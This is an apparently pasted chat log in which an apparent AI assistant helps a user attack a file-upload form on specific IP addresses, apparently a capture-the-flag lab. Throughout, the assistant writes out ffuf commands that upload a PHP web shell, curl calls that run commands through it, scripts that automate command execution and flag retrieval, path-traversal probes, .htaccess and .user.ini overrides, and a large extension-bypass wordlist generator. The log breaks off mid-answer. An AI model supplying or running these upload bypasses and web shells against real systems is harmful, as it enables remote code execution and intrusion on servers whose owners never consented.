+If the server returns JSON responses, use:
+
+bash
+-mr '"status":"success"' 
+Post-Fuzzing Verification:
+For any potentially successful uploads, verify with:
+
+bash
+# Check if file exists
+ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
+     -w potential_hits.txt \
+     -mc 200 -fs 280  # Exclude the 403 response size you saw earlier
+
+# Test command execution
+curl "http://94.237.51.90:47341/profile_images/shell123.jpg?cmd=id"
+Advanced Filtering:
+If the server uses custom success messages, first capture a baseline:
+
+bash
+# 1. Make a legitimate upload request with a valid file
+curl -i -X POST [normal_upload_request] > valid_response.txt
+
+# 2. Extract unique success indicators
+grep -oP "unique-success-pattern" valid_response.txt
+
+# 3. Use these in ffuf
+-mr "File uploaded successfully|upload_id:"
+Would you like me to suggest specific payload modifications that often bypass upload restrictions? Common successful patterns include:
+
+.php5
+
+.phtml
+
+.phar
+
+Double extensions with null bytes (shell.jpg%00.php)
+
+every thing will be OK so I need to check its contents man
+Got it! You want to verify the contents of any successfully uploaded files to confirm code execution. Here's a comprehensive approach:
+
+1. First, Identify Successful Uploads
+bash
+ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
+     -w word2.txt \
+     -mc 200 -fc 403 \
+     -t 20 \
+     -o found_files.json
+2. Manual Verification of Files
+For each potentially uploaded file from your results:
+
+Check File Contents:
+bash
+curl "http://94.237.51.90:47341/profile_images/suspicious_file.phps"
+Verify PHP Execution:
+bash
+# Test with simple command
+curl "http://94.237.51.90:47341/profile_images/shell.phps?cmd=whoami"
+
+# Full interactive test
+curl "http://94.237.51.90:47341/profile_images/shell.phps?cmd=id;uname -a;pwd"
+3. Automated Content Checking
+Create a verification script (verify.sh):
+
+bash
+#!/bin/bash
+for file in $(cat found_files.json | jq -r '.results[] | select(.status == 200) | .input.FUZZ'); do
+    echo -e "\n\033[1;36mTesting $file\033[0m"
+    # Check if file exists
+    curl -s "http://94.237.51.90:47341/profile_images/$file" | head -c 100
+    # Test command execution
+    echo -e "\nCommand execution:"
+    curl -s "http://94.237.51.90:47341/profile_images/$file?cmd=id" | grep -v "not allowed"
+done
+4. Common Success Patterns to Check
+If you find uploaded files but they're not executing:
+
+Check for Magic Bytes Bypass:
+bash
+# Create JPEG with PHP payload
+echo -e "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > shell.jpg.php
+
+# Upload and verify
+curl -X POST -F "file=@shell.jpg.php" http://target/upload.php
+Check for .htaccess Override:
+bash
+echo "AddType application/x-httpd-php .xyz" > .htaccess
+curl -X POST -F "file=@.htaccess" http://target/upload.php
+5. Debugging Tips
+If you get 200 but no execution:
+
+bash
+# Check file permissions
+curl "http://target/profile_images/shell.php?cmd=ls -la"
+
+# Check disabled functions
+curl "http://target/profile_images/shell.php?cmd=phpinfo();"
+6. Final Verification Checklist
+Confirm HTTP 200 response
+
+Verify actual file contents match what you uploaded
+
+Test with simple command execution
+
+Check for any output filtering/WAF blocking
+
+Would you like me to provide specific payloads that commonly work when standard uploads fail? For example:
+
+Case-insensitive extensions (.PhP, .pHp5)
+
+Double extensions with null bytes
+
+Magic byte injections
+
+.htaccess override techniques
+
+the server will return specific "successfully uploaded" string if this fuzz works so every word will be 200 ok with "please upload photo"
+Ah, I understand now! You need to filter specifically for the "successfully uploaded" response while excluding the generic 200 OK responses that just say "please upload photo". Here's the precise ffuf command to achieve this:
+
+Optimized FFUF Command for Exact Success Detection
+bash
+ffuf -u "http://94.237.51.90:47341/upload.php" \
+     -X POST \
+     -w word2.txt \
+     -H "Host: 94.237.51.90:47341" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     -b "PHPSESSID=12345" \
+     -d $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n' \
+     -mc 200 \                       # Match HTTP 200 responses
+     -mr "successfully uploaded" \    # ONLY show responses containing this EXACT phrase
+     -fr "please upload photo" \      # FILTER OUT responses with this phrase
+     -o successful_uploads.json \
+     -t 20 \
+     -rate 5
+Key Adjustments
+-mr "successfully uploaded"
+→ Only matches responses containing "successfully uploaded" (case-sensitive).
+
+-fr "please upload photo"
+→ Explicitly filters out responses that say "please upload photo" (common false positive).
+
+-mc 200
+→ Still ensures only HTTP 200 responses are considered (but now with stricter content filtering).
+
+Slower Rate (-t 20 -rate 5)
+→ Avoids WAF/rate-limiting while testing.
+
+Post-Fuzzing Verification
+If you get hits, manually verify them:
+
+bash
+# Check if the file was really uploaded
+curl "http://94.237.51.90:47341/profile_images/shell.phps"
+
+# Test command execution (if it's a PHP shell)
+curl "http://94.237.51.90:47341/profile_images/shell.phps?cmd=id"
+Alternative Approach (If Exact String is Unknown)
+If you're unsure of the exact success message, but know it’s different from "please upload photo", use:
+
+bash
+ffuf ... (same as above) \
+     -mc 200 \
+     -fr "please upload photo" \  
+     -fs 1234  # Filter out responses with a specific size (if "please upload photo" has a fixed length)
+Expected Outcomes
+✅ Success → Returns only filenames that trigger "successfully uploaded".
+❌ No Results? → The server may be blocking all your payloads (check WAF bypass techniques).
+
+Would you like me to suggest advanced bypass payloads (null bytes, case tampering, .htaccess tricks) if this doesn’t work?
+
+:: Progress: [3452/3452] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
+Command '-mr' not found, did you mean:
+  command 'mr' from deb myrepos
+  command 'amr' from deb acr
+Try: sudo apt install <deb name>
+-fr: command not found
+-o: command not found
+It looks like you're encountering shell syntax issues when running the ffuf command. The errors (-mr not found, -fr not found, etc.) suggest that the shell is interpreting the flags as separate commands rather than passing them to ffuf. Here's how to fix this:
+
+Corrected FFUF Command (Proper Syntax)
+bash
+ffuf -u "http://94.237.51.90:47341/upload.php" \
+     -X POST \
+     -w word2.txt \
+     -H "Host: 94.237.51.90:47341" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     -b "PHPSESSID=12345" \
+     -d "------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n" \
+     -mr "successfully uploaded" \
+     -fr "please upload photo" \
+     -o successful_uploads.json \
+     -t 20 \
+     -rate 5
+Key Fixes:
+Removed $'...' syntax for the -d parameter (use regular double quotes)
+
+Properly escaped inner quotes in the form data
+
+Ensure all flags are on the same line (using \ line continuations)
+
+Alternative Solution (If Still Having Issues)
+If you're still getting syntax errors, try this simplified version:
+
+bash
+ffuf -u http://94.237.51.90:47341/upload.php -X POST -w word2.txt -H "Host: 94.237.51.90:47341" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" -H "X-Requested-With: XMLHttpRequest" -H "Origin: http://94.237.51.90:47341" -H "Referer: http://94.237.51.90:47341/" -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" -b "PHPSESSID=12345" -d "------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n" -mr "successfully uploaded" -fr "please upload photo" -o successful_uploads.json -t 20 -rate 5
+If You're Seeing "Command Not Found" for FFUF Itself:
+Make sure ffuf is installed:
+
+bash
+which ffuf || sudo apt install ffuf  # Or download from github.com/ffuf/ffuf
+Verify installation:
+
+bash
+ffuf -version
+"Only images are allowed" is a fail command otherwise "File successfully uploaded"
+Here's the optimized ffuf command to specifically detect successful file uploads while filtering out failures:
+
+bash
+ffuf -u "http://94.237.51.90:47341/upload.php" \
+     -X POST \
+     -w word2.txt \
+     -H "Host: 94.237.51.90:47341" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     -b "PHPSESSID=12345" \
+     -d "------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n" \
+     -mr "File successfully uploaded" \
+     -fr "Only images are allowed" \
+     -o successful_uploads.json \
+     -t 20 \
+     -rate 5
+Key Features:
+Precise Matching:
+
+-mr "File successfully uploaded" - Only shows responses containing this exact success message
+
+-fr "Only images are allowed" - Explicitly filters out failed upload attempts
+
+Reliable Detection:
+
+Uses both positive (-mr) and negative (-fr) matching to ensure only genuine successes are shown
+
+HTTP 200 status is implied when using match/filter response
+
+Performance:
+
+Conservative rate (-t 20 -rate 5) to avoid triggering WAF protections
+
+Properly escaped form data to prevent shell interpretation issues
+
+Output:
+
+Results saved to successful_uploads.json for later analysis
+
+Verification:
+After finding potential uploads, verify with:
+
+bash
+# Check if file exists
+curl "http://94.237.51.90:47341/profile_images/suspected_file.phps"
+
+# Test command execution
+curl "http://94.237.51.90:47341/profile_images/shell.phps?cmd=id"
+Alternative Approach:
+If you're still getting false positives, try adding size filtering:
+
+bash
+# First capture the size of "Only images are allowed" response
+curl -s "http://94.237.51.90:47341/upload.php" | wc -c
+
+# Then add to ffuf (example if failure response is 280 bytes)
+-fs 280
+This ensures you're filtering by both content and size for maximum accuracy.
+
+#!/bin/bash
+#usage: supply your filename wordlist with the execution of this script. It replaces each line with $line 
+#./repeat.sh wordlist.txt
+
+input=$1
+while IFS= read -r line
+do
+        echo 'doing' $line':'
+        curl -I http://83.136.255.115:46810/profile_images/$line?cmd=id
+done < "$input"
+                       make it better
+Here's an improved version of your script with better error handling, progress tracking, and output formatting:
+
+bash
+#!/bin/bash
+# Enhanced File Upload Tester
+# Usage: ./upload_tester.sh wordlist.txt
+
+if [ $# -eq 0 ]; then
+    echo "Error: No wordlist specified"
+    echo "Usage: $0 wordlist.txt"
+    exit 1
+fi
+
+input="$1"
+total_lines=$(wc -l < "$input")
+current_line=0
+success_count=0
+timestamp=$(date +"%Y%m%d_%H%M%S")
+output_file="results_${timestamp}.txt"
+
+echo "Starting file upload test with $total_lines entries..."
+echo "Output will be saved to $output_file"
+echo ""
+
+while IFS= read -r line; do
+    ((current_line++))
+    echo -n "[$current_line/$total_lines] Testing $line: "
+    
+    response=$(curl -s -o /dev/null -w "%{http_code}" "http://83.136.255.115:46810/profile_images/$line?cmd=id")
+    
+    if [ "$response" -eq 200 ]; then
+        echo -e "\033[32mSUCCESS\033[0m (200 OK)"
+        echo "$line" >> "$output_file"
+        ((success_count++))
+        
+        # Optional: Test command execution
+        execution_result=$(curl -s "http://83.136.255.115:46810/profile_images/$line?cmd=id")
+        echo "  Command execution result: $execution_result" | tee -a "$output_file"
+    else
+        echo -e "\033[31mFAILED\033[0m ($response)"
+    fi
+    
+    # Small delay to avoid overwhelming the server
+    sleep 0.5
+    
+done < "$input"
+
+echo ""
+echo "Test completed. Found $success_count potentially vulnerable files."
+echo "Successful uploads saved to $output_file"
+Key Improvements:
+Better Usage Handling:
+
+Checks for input file
+
+Shows proper usage if no file specified
+
+Progress Tracking:
+
+Shows current line/total count
+
+Color-coded success/failure indicators
+
+Result Verification:
+
+Checks HTTP status code (200 = success)
+
+Tests command execution for successful finds
+
+Saves results to timestamped output file
+
+Performance:
+
+Added small delay between requests
+
+Silent mode for cleaner output
+
+Output:
+
+Detailed summary at completion
+
+Successful finds saved to file
+
+Additional Features You Could Add:
+Parallel Testing (use xargs or parallel):
+
+bash
+xargs -P 10 -I {} curl -s -o /dev/null -w "{} %{http_code}\n" "http://target/profile_images/{}" < "$input"
+Custom Headers Support:
+
+bash
+headers=(
+    "-H 'User-Agent: Mozilla/5.0'"
+    "-H 'X-Custom: test'"
+)
+curl "${headers[@]}" "http://target/profile_images/$line"
+Timeout Handling:
+
+bash
+curl --max-time 5 --connect-timeout 3 ...
+Retry Mechanism:
+
+bash
+max_retries=3
+retry_count=0
+while [ $retry_count -lt $max_retries ]; do
+    response=$(curl ...)
+    [ "$response" -eq 200 ] && break
+    ((retry_count++))
+    sleep 1
+done
+To use the improved script:
+
+bash
+chmod +x upload_tester.sh
+./upload_tester.sh wordlist.txt
+I want to  find flag.txt
+Here's a comprehensive approach to find flag.txt on the target system, building on your file upload testing:
+
+1. First, Check Common Flag Locations
+bash
+#!/bin/bash
+# Fast flag location checker
+# Usage: ./find_flag.sh
+
+common_locations=(
+    "/flag.txt"
+    "/var/www/html/flag.txt"
+    "/home/flag.txt"
+    "/root/flag.txt"
+    "/tmp/flag.txt"
+    "/var/lib/flag.txt"
+)
+
+for location in "${common_locations[@]}"; do
+    echo -n "Checking $location: "
+    if curl -s "http://83.136.255.115:46810/profile_images/../../../../..$location" | grep -q "[A-Za-z0-9]{32}"; then
+        echo -e "\033[32mFOUND!\033[0m"
+        curl -s "http://83.136.255.115:46810/profile_images/../../../../..$location"
+        exit 0
+    else
+        echo -e "\033[31mNot found\033[0m"
+    fi
+done
+
+echo "Flag not found in common locations. Trying deeper search..."
+2. If You Have Command Execution
+If you found a vulnerable upload that allows command execution:
+
+bash
+# Search entire filesystem (basic)
+curl "http://83.136.255.115:46810/profile_images/shell.php?cmd=find / -name flag.txt 2>/dev/null"
+
+# More thorough search
+curl "http://83.136.255.115:46810/profile_images/shell.php?cmd=grep -r 'FLAG{' / 2>/dev/null"
+3. Automated Full Search Script
+bash
+#!/bin/bash
+# Comprehensive flag finder with upload testing
+# Usage: ./find_flag_with_upload.sh wordlist.txt
+
+if [ $# -eq 0 ]; then
+    echo "Usage: $0 wordlist.txt"
+    exit 1
+fi
+
+input="$1"
+timestamp=$(date +"%Y%m%d_%H%M%S")
+output_file="flag_search_${timestamp}.log"
+
+echo "Starting flag search..." | tee "$output_file"
+
+while IFS= read -r line; do
+    # Test if file exists in upload directory
+    status=$(curl -s -o /dev/null -w "%{http_code}" "http://83.136.255.115:46810/profile_images/$line")
+    
+    if [ "$status" -eq 200 ]; then
+        echo "[+] Found accessible file: $line" | tee -a "$output_file"
+        
+        # Test for command execution
+        exec_test=$(curl -s "http://83.136.255.115:46810/profile_images/$line?cmd=id")
+        if [[ "$exec_test" == *"uid="* ]]; then
+            echo "[!] COMMAND EXECUTION WORKING!" | tee -a "$output_file"
+            
+            # Search for flag
+            echo "[*] Searching for flag.txt..." | tee -a "$output_file"
+            flag_locations=$(curl -s "http://83.136.255.115:46810/profile_images/$line?cmd=find / -type f -name flag.txt 2>/dev/null")
+            
+            if [ -n "$flag_locations" ]; then
+                echo -e "\033[32m[+] FLAG LOCATIONS FOUND:\033[0m" | tee -a "$output_file"
+                echo "$flag_locations" | tee -a "$output_file"
+                
+                # Retrieve first found flag
+                first_flag=$(echo "$flag_locations" | head -1)
+                flag_content=$(curl -s "http://83.136.255.115:46810/profile_images/$line?cmd=cat $(echo $first_flag | sed 's/ /\\ /g')")
+                echo -e "\033[32m[+] FLAG CONTENT:\033[0m $flag_content" | tee -a "$output_file"
+                exit 0
+            else
+                echo "[-] No flag.txt found via find command" | tee -a "$output_file"
+            fi
+        fi
+    fi
+done < "$input"
+
+echo "[-] Flag not found through automated search" | tee -a "$output_file"
+4. Alternative Methods If Upload Fails
+If you can't find an upload vulnerability:
+
+bash
+# Check for LFI vulnerabilities
+curl "http://83.136.255.115:46810/page.php?file=../../../../etc/passwd"
+
+# Check backup files
+curl "http://83.136.255.115:46810/profile_images/flag.txt.bak"
+
+# Check environment variables
+curl "http://83.136.255.115:46810/cgi-bin/status"  # Might leak env vars
+5. Post-Exploitation Flag Search
+If you get limited shell access:
+
+bash
+# Quick search
+find / -name "*flag*" 2>/dev/null
+
+# Content search (for CTF-style flags)
+grep -r "FLAG{" / 2>/dev/null
+
+# Check common directories
+ls -la /root /home /var/www
+Remember to:
+
+Check file permissions (ls -la /path/to/flag.txt)
+
+Try different path traversal depths (../ vs ../../../../)
+
+Check for hidden files/directories
+
+Look in backups (/var/backups) and logs (/var/log)
+
+extensions=('.php' '.phps' '.phar' '.phtml' '.php5' '.php7' '.htaccess') should I add some more extensions?
+Here's an expanded list of file extensions you should consider for file upload testing, along with smart testing strategies:
+
+Recommended Additional Extensions
+bash
+extensions=(
+    # PHP variants
+    '.php' '.phps' '.phar' '.phtml' '.php3' '.php4' '.php5' '.php7' '.php8'
+    '.php.gz' '.php.inc' '.php.test' '.php.txt'
+    
+    # Engine-specific
+    '.asp' '.aspx' '.jsp' '.jspx' '.cfm' '.action'
+    
+    # Server configs
+    '.htaccess' '.htpasswd' '.user.ini'
+    
+    # Double extensions
+    '.jpg.php' '.png.php' '.gif.php'
+    '.php.jpg' '.php.png' '.php.gif'
+    
+    # Null byte tricks (URL-encoded)
+    '.php%00.jpg' '.php%00.png'
+    '.php\x00.jpg' '.php\0.jpg'
+    
+    # Case variations
+    '.PHP' '.Php' '.pHp' '.pHP'
+    
+    # Special characters
+    '.php.' '.php..' '.php ' '.php%20'
+    '.php:' '.php;' '.php|' '.php%0a'
+    
+    # Archive formats
+    '.zip' '.tar.gz' '.rar' # If file extraction is possible
+    
+    # Template files
+    '.tpl' '.twig' '.blade.php'
+    
+    # Less common
+    '.shtml' '.pht' '.pgif' '.phpt'
+)
+Smart Testing Strategies
+Test with Multiple Payloads:
+
+bash
+# Test each extension with different content types
+for ext in "${extensions[@]}"; do
+    echo "Testing $ext:"
+    # 1. Basic PHP shell
+    echo '<?php system($_GET["cmd"]); ?>' > shell$ext
+    # 2. Polyglot file (e.g., PHP+JPEG)
+    echo -e "\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>" > polyglot$ext
+    # Upload both versions
+done
+Content-Type Bypass:
+
+bash
+# Try different Content-Type headers
+content_types=(
+    "image/jpeg"
+    "image/png"
+    "text/plain"
+    "application/x-php"
+)
+.htaccess Override:
+
+bash
+# If .htaccess upload works, add these rules:
+echo "AddType application/x-httpd-php .xyz" > .htaccess
+echo "AddHandler application/x-httpd-php .abc" >> .htaccess
+User.ini Technique:
+
+bash
+# For PHP configurations
+echo "auto_prepend_file=shell.jpg" > .user.ini
+Critical Extensions to Prioritize
+.htaccess - Can override server settings
+
+.phar - PHP Archive (often overlooked)
+
+.phtml - Executable HTML with PHP
+
+%00.jpg - Null byte bypass
+
+.php5 - Alternative PHP handler
+
+Pro Tip:
+Monitor server responses for:
+
+Different HTTP status codes (200 vs 403 vs 500)
+
+Varying response sizes
+
+Changes in error messages
+
+Time delays (WAF fingerprinting)
+
+Would you like me to provide a ready-to-use test script that systematically tries all these extensions with different bypass techniques?
+
+# Special characters to test
+chars=('%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' '%3B' '%26' '%23')
+
+# Generate all combinations
+for char in "${chars[@]}"; do
+    for ext in "${extensions[@]}"; do
+        # Basic patterns
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+        
+        
+        
+	echo "shell$char$ext.jpeg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+        
+        # Advanced patterns
+        echo "shell$char$ext%00.jpg" >> wordlist.txt
+        echo "shell$ext::$DATA.jpg" >> wordlist.txt
+        echo "shell$ext%20" >> wordlist.txt
+    done
+done
+
+# Add double extensions
+for ext in "${extensions[@]}"; do
+    echo "shell$ext.jpg" >> wordlist.txt
+    echo "shell.jpg$ext" >> wordlist.txt
+    echo "shell$ext.png" >> wordlist.txt
+done
+
+# Add case variations
+echo "shell.PhP" >> wordlist.txt
+echo "shell.pHp5" >> wordlist.txt
+
+echo "Wordlist generated with $(wc -l wordlist.txt | awk '{print $1}') entries"///////////////////////add here png,jpeg,jpg,gif or kind img files
+Here's the enhanced version of your wordlist generator that includes image file extensions and creates more comprehensive bypass combinations:
+
+bash
+#!/bin/bash
+# Advanced File Upload Bypass Wordlist Generator
+# Generates combinations of executable extensions with image files and special chars
+
+# Clear existing wordlist
+> wordlist.txt
+
+# Executable extensions
+extensions=('.php' '.phps' '.phar' '.phtml' '.php5' '.php7' '.htaccess' '.pht' '.pgif')
+# Image extensions
+img_extensions=('.jpg' '.jpeg' '.png' '.gif' '.bmp' '.svg' '.webp')
+# Special characters
+chars=('%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' '%3B' '%26' '%23')
+
+echo "[+] Generating basic extension combinations..."
+for ext in "${extensions[@]}"; do
+    # Pure executable extensions
+    echo "shell$ext" >> wordlist.txt
+    
+    # Double extensions with images
+    for img in "${img_extensions[@]}"; do
+        echo "shell$ext$img" >> wordlist.txt
+        echo "shell$img$ext" >> wordlist.txt
+    done
+done
+
+echo "[+] Generating special character bypass combinations..."
+for char in "${chars[@]}"; do
+    for ext in "${extensions[@]}"; do
+        for img in "${img_extensions[@]}"; do
+            # Character between extensions
+            echo "shell$ext$char$img" >> wordlist.txt
+            echo "shell$img$char$ext" >> wordlist.txt
+            
+            # Character at different positions
+            echo "shell$char$ext$img" >> wordlist.txt
+            echo "shell$img$ext$char" >> wordlist.txt
+            
+            # Multiple special chars
+            echo "shell$ext$char$img$char" >> wordlist.txt
+        done
+        
+        # Special cases
+        echo "shell::$DATA$ext" >> wordlist.txt
+        echo "shell$ext::$DATA" >> wordlist.txt
+        echo "shell$ext%20" >> wordlist.txt
+        echo "shell$ext " >> wordlist.txt  # Literal space
+    done
+done
+
+echo "[+] Generating case variation bypasses..."
+for ext in "${extensions[@]}"; do
+    # Case variations
+    echo "shell${ext^^}" >> wordlist.txt  # Uppercase
+    echo "shell${ext~~}" >> wordlist.txt  # Inverted case
+    
+    # Mixed case examples
+    echo "shell.Php" >> wordlist.txt
+    echo "shell.pHp5" >> wordlist.txt
+    echo "shell.PHAR" >> wordlist.txt
+    
+    # With image extensions
+    for img in "${img_extensions[@]}"; do
+        echo "shell${ext^^}$img" >> wordlist.txt
+        echo "shell$img${ext^^}" >> wordlist.txt
+    done
+done
+
+echo "[+] Generating polyglot file names..."
+# Polyglot files (both image and executable)
+for ext in "${extensions[@]}"; do
+    for img in "${img_extensions[@]}"; do
+        echo "image$ext$img" >> wordlist.txt
+        echo "photo$img$ext" >> wordlist.txt
+        echo "picture$ext$img" >> wordlist.txt
+    done
+done
+
+# Add Windows-specific bypasses
+echo "[+] Adding Windows-specific bypasses..."
+win_chars=(':' '>' '<' '*' '?')
+for char in "${win_chars[@]}"; do
+    for ext in "${extensions[@]}"; do
+        echo "shell$char$ext" >> wordlist.txt
+        echo "shell$ext$char" >> wordlist.txt
+    done
+done
+
+# Final count and deduplication
+sort -u wordlist.txt -o wordlist.txt
+total=$(wc -l < wordlist.txt)
+echo "[+] Wordlist generation complete!"
+echo "[+] Total unique entries: $total"
+echo "[+] Saved to wordlist.txt"
+Key Improvements:
+Added Comprehensive Image Extensions:
+
+Includes all common image formats (.jpg, .jpeg, .png, .gif, etc.)
+
+Generates combinations with both leading and trailing positions
+
+Enhanced Special Character Testing:
+
+Tests special characters in multiple positions
+
+Includes Windows-specific special characters (:, >, <, *, ?)
+
+Case Variation Testing:
+
+Systematic case variation testing (uppercase, mixed case)
+
+Combined with image extensions
+
+Polyglot File Names:
+
+Generates realistic-looking filenames (image.php.jpg, photo.png.php)
+
+Optimized Output:
+
+Automatic deduplication with sort -u
+
+Progress reporting during generation
+
+Final count of unique entries
+
+Example Output Entries:
+shell.php.jpg
+shell.jpg.php
+shell.php%00.jpg
+shell.php%20
+shell.pHp5
+shell.png.pHp
+shell::DATA.php
+shell.php%0a.jpg
+image.php.png
+photo.jpg.php
+This wordlist will test:
+
+All standard bypass techniques
+
+Case sensitivity issues
+
+Special character handling
+
+MIME type verification bypasses
+
+Polyglot file acceptance
+
+Windows/Linux path handling differences
+
+Would you like me to add any specific advanced techniques like:
+
+Null byte variations
+
+Path traversal combinations
+
+.htaccess payloads
+
+User.ini configurations?
+
+: Progress: [7292/7292] :: Job [1/1] :: 5 req/sec :: Duration: [0:24:18] :: Errors: 7292 ::
+                                                                                                                                                            
+┌──(euyin㉿justice2638)-[~/Desktop]
+└─$ cat successful_uploads.json
+{"commandline":"ffuf -u http://94.237.51.90:47341/upload.php -X POST -w wordlist.txt -H Host: 94.237.51.90:47341 -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 -H X-Requested-With: XMLHttpRequest -H Origin: http://94.237.51.90:47341 -H Referer: http://94.237.51.90:47341/ -H Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH -b PHPSESSID=12345 -d ------WebKitFormBoundaryr76uBlWtCOXnfvFH\\r\\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\\r\\n\\r\\n\u003c?php system($_GET[\"cmd\"]); ?\u003e\\r\\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\\r\\n -mr File successfully uploaded -fr Only images are allowed -o successful_uploads.json -t 20 -rate 5","time":"2025-05-04T04:06:19-04:00","results":[],"config":{"autocalibration":false,"autocalibration_keyword":"FUZZ","autocalibration_perhost":false,"autocalibration_strategies":["basic"],"autocalibration_strings":[],"colors":false,"cmdline":"ffuf -u http://94.237.51.90:47341/upload.php -X POST -w wordlist.txt -H Host: 94.237.51.90:47341 -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 -H X-Requested-With: XMLHttpRequest -H Origin: http://94.237.51.90:47341 -H Referer: http://94.237.51.90:47341/ -H Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH -b PHPSESSID=12345 -d ------WebKitFormBoundaryr76uBlWtCOXnfvFH\\r\\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\\r\\n\\r\\n\u003c?php system($_GET[\"cmd\"]); ?\u003e\\r\\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\\r\\n -mr File successfully uploaded -fr Only images are allowed -o successful_uploads.json -t 20 -rate 5","configfile":"","postdata":"------WebKitFormBoundaryr76uBlWtCOXnfvFH\\r\\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\\r\\n\\r\\n\u003c?php system($_GET[\"cmd\"]); ?\u003e\\r\\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\\r\\n","debuglog":"","delay":{"value":"0.00"},"dirsearch_compatibility":false,"encoders":[],"extensions":[],"fmode":"or","follow_redirects":false,"headers":{"Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH","Cookie":"PHPSESSID=12345","Host":"94.237.51.90:47341","Origin":"http://94.237.51.90:47341","Referer":"http://94.237.51.90:47341/","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36","X-Requested-With":"XMLHttpRequest"},"ignorebody":false,"ignore_wordlist_comments":false,"inputmode":"clusterbomb","cmd_inputnum":100,"inputproviders":[{"name":"wordlist","keyword":"FUZZ","value":"/home/euyin/Desktop/wordlist.txt","encoders":"","template":""}],"inputshell":"","json":false,"matchers":{"IsCalibrated":false,"Mutex":{},"Matchers":{"regexp":{"value":"File successfully uploaded"}},"Filters":{"regexp":{"value":"Only images are allowed"}},"PerDomainFilters":{}},"mmode":"or","maxtime":0,"maxtime_job":0,"method":"POST","noninteractive":false,"outputdirectory":"","outputfile":"successful_uploads.json","outputformat":"json","OutputSkipEmptyFile":false,"proxyurl":"","quiet":false,"rate":5,"raw":false,"recursion":false,"recursion_depth":0,"recursion_strategy":"default","replayproxyurl":"","requestfile":"","requestproto":"https","scraperfile":"","scrapers":"all","sni":"","stop_403":false,"stop_all":false,"stop_errors":false,"threads":20,"timeout":10,"url":"http://94.237.51.90:47341/upload.php","verbose":false,"wordlists":["/home/euyin/Desktop/wordlist.txt"],"http2":false,"client-cert":"","client-key":""}}                                                                                                                                                            
+┌──(euyin㉿justice2638)-[~/Desktop]
+guess that is no joy right?
+Based on your results showing 7,292 errors and 0 successful uploads, it appears the server has strong protections against standard file upload bypass techniques. However, let's try some advanced methods before giving up.
+
+Next-Level Bypass Techniques to Try:
+Magic Byte Injection (Polyglot Files)
+
+bash
+# Create a fake JPEG with PHP payload
